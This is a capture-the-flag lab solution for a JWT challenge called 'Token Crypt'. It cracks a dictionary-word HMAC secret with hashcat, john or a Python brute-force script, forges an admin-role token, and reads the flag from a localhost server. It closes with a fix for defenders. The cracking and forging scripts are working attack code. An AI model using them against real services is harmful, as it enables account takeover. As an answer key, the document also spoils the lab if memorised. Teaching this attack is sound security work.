# w04 :: Token Crypt — Solution

**Weak secret:** `nightwatch` (a single dictionary word, present in rockyou).

## 1. Recon / get a sample token

```bash
curl -s -X POST http://localhost:30004/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"guest","password":"guest"}'
# {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9......."}
```

Save it and look at the claims:

```bash
TOK=$(curl -s -X POST http://localhost:30004/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"guest","password":"guest"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json;p=sys.stdin.read().strip();p+="="*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p)))'
# {'sub': 'guest', 'role': 'user', 'iat': ..., 'exp': ...}
```

## 2. Crack the signing secret

The header/payload are known, so the HMAC-SHA256 signature is a plain offline
guess against a wordlist. This is exactly how hashcat mode 16500 / john
`--format=HMAC-SHA256` work.

### Option A — hashcat

```bash
# write the full token to a file, hashcat strips the signature itself
echo "$TOK" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
# -> ...:nightwatch
```

### Option B — john

```bash
echo "$TOK" > token.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt token.txt
```

### Option C — python3 one-liner (no tooling needed)

This is the script used to verify the lab. It tries candidate secrets from a
wordlist against the captured token and prints the first match:

```bash
python3 - "$TOK" /usr/share/wordlists/rockyou.txt <<'PY'
import sys, hmac, hashlib, base64
tok, wl = sys.argv[1], sys.argv[2]
h, p, sig = tok.split(".")
want = base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))
for word in open(wl, encoding="latin-1"):
    w = word.rstrip("\n")
    if hmac.compare_digest(
        hmac.new(w.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest(), want
    ):
        print("SECRET:", w); break
else:
    print("not found")
PY
# SECRET: nightwatch
```

If you don't have rockyou, a small custom list containing the word is enough:

```bash
printf 'letmein\nnightwatch\nspring2024\n' > words.txt
```

## 3. Forge an admin token

Re-sign a payload with `role:"admin"` using the recovered secret:

```bash
python3 - <<'PY' > admin.txt
import hmac, hashlib, base64, json, time

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

secret = b"nightwatch"
h = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
p = b64(json.dumps({"sub":"admin","role":"admin",
                    "iat":int(time.time()), "exp":int(time.time())+3600},
                   separators=(",",":")).encode())
sig = b64(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{sig}")
PY
```

## 4. Read the flag

```bash
ADMIN=$(cat admin.txt)
curl -s http://localhost:30004/api/admin -H "Authorization: Bearer $ADMIN"
# {"flag":"hex4b0t{...}"}
```

Confirm the token decodes for the authority too:

```bash
curl -s http://localhost:30004/api/me -H "Authorization: Bearer $ADMIN"
# {"role":"admin","sub":"admin",...}
```

## 5. What does NOT work (intentional)

- **`alg:none`** — the server only accepts `alg=="HS256"` and rejects every
  other header. A `{"alg":"none"}` token with an empty signature returns
  `403 {"error":"invalid token"}`.
- **Wrong secret** — any token signed with a different key returns
  `403 {"error":"invalid token"}`.
- **`role:"user"` with a valid signature** — signature passes but
  `/api/admin` returns `403 {"error":"clearance denied"}`.

## Fix (for defenders)

Use a long, random, high-entropy secret (32+ bytes from a CSPRNG) stored
outside source control; rotate it per environment; verify the `alg` against an
allow-list and pin `typ`. A dictionary word — however "cyberpunk" it sounds —
is brute-forceable in seconds.
